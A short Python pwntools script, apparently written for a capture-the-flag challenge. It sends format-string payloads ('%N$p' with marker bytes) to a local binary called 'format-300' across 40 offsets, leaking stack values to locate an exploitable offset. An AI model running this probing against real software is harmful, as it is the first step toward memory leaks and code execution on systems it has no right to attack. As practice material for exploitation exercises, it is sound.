from pwn import *



for i in range(40):
    print(i)
    string = f"%{i}$p AAAABBBB"
    p = process('./format-300')
    p.sendline(string.encode())
    print(p.recvline())
    p.close()
